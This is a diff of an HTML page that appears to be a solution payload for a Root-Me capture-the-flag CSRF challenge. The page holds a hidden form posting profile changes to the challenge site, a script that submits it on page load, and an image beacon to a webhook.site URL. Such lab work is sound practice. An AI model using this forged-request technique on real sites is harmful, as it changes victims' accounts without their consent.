@@ -1,9 +1,9 @@
 <img src="https://webhook.site/f89d34d9-8288-4dfb-8837-81bb784d1c6c?t=github" />
-<form action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="post" enctype="multipart/form-data">
+<form id="myForm" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="post" enctype="multipart/form-data">
     <input type="text" name="username" value="test">
     <input type="text" name="status" value="on">
     <button type="submit">Submit</button>
 </form>
 <script>
-    document.forms[0].submit();
+    document.getElementById("myForm").submit();
 </script>
